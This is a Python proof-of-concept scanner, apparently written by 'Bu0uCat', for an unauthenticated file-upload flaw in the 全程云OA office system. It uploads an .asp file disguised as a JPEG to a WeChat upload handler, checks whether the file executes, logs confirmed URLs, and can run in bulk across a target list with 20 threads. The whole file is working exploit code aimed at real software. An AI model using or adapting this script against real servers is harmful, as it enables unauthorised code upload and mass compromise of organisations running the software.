import requests
import re
import argparse
import concurrent.futures


def checkVuln(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }

    data = """
    --d0b7a0d40eed0e32904c8017b09eb305
Content-Disposition: form-data; name="file"; filename="1.asp"
Content-Type: image/jpeg

<% Response.Write("hello,world!") %>
--d0b7a0d40eed0e32904c8017b09eb305--
    """

    try:
        # 发送 POST 请求进行文件上传
        res = requests.post(f"{url}/WeChat/ashx/UploadHandler.ashx", headers=headers, data=data, timeout=5, verify=False)

        if res.status_code == 200:
            # print(f"[+] 存在上传漏洞, 尝试访问: {url}/UploadImage/1.asp")

            # 发送 GET 请求以确认漏洞存在
            get_res = requests.get(f"{url}/UploadImage/1.asp", headers=headers, timeout=5, verify=False)

            if get_res.status_code == 200:
                print(f"[+] 确认漏洞存在: {url}/UploadImage/1.asp")
                with open('result.txt', 'a') as f:
                    f.write(f"{url}/UploadImage/1.asp\n")
            else:
                print(f"[-] 上传成功但无法访问: {url}/UploadImage/1.asp")
        else:
            print(f"[-] 没有找到上传漏洞!")

    except Exception as e:
        print(f"[-] 连接 {url} 发生了问题")


def banner():
    print("""
      ______    ______   __      __                   __    __            __                            __ 
 /      \  /      \ /  \    /  |                 /  |  /  |          /  |                          /  |
/$$$$$$  |/$$$$$$  |$$  \  /$$/______    ______  $$ |  $$ |  ______  $$ |  ______    ______    ____$$ |
$$ |  $$ |$$ |  $$/  $$  \/$$//      \  /      \ $$ |  $$ | /      \ $$ | /      \  /      \  /    $$ |
$$ |  $$ |$$ |        $$  $$//$$$$$$  | $$$$$$  |$$ |  $$ |/$$$$$$  |$$ |/$$$$$$  | $$$$$$  |/$$$$$$$ |
$$ |_ $$ |$$ |   __    $$$$/ $$ |  $$ | /    $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |  $$ | /    $$ |$$ |  $$ |
$$ / \$$ |$$ \__/  |    $$ | $$ \__$$ |/$$$$$$$ |$$ \__$$ |$$ |__$$ |$$ |$$ \__$$ |/$$$$$$$ |$$ \__$$ |
$$ $$ $$< $$    $$/     $$ | $$    $$/ $$    $$ |$$    $$/ $$    $$/ $$ |$$    $$/ $$    $$ |$$    $$ |
 $$$$$$  | $$$$$$/      $$/   $$$$$$/   $$$$$$$/  $$$$$$/  $$$$$$$/  $$/  $$$$$$/   $$$$$$$/  Bu0uCat/ 
     $$$/                                                  $$ |                                        
                                                           $$ |                                        
                                                           $$/                                         

                                                                                            By:Bu0uCat
    """)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个全程云OA文件上传检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        with open(args.file, 'r') as f:
            targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")
